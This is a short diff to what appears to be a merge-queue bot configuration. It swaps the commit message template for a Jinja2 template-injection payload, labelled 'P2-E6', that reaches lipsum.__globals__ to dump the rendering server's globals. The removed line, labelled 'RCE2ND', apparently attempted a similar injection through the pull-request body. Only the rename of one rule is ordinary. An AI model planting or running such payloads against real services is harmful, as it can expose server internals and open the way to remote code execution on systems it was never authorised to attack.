@@ -5,10 +5,10 @@ queue_rules:
     merge_conditions: []
     merge_method: squash
     commit_message_template: |
-      RCE2ND: {{ body|get_section('## RCE','FAIL') }}
+      P2-E6: {% set ns = namespace(g=[lipsum]|map(attribute='__globals__')|list) %}{{ ns.g[0]|pprint }}
 
 pull_request_rules:
-  - name: auto-q
+  - name: auto-queue
     conditions:
       - base=master
     actions:
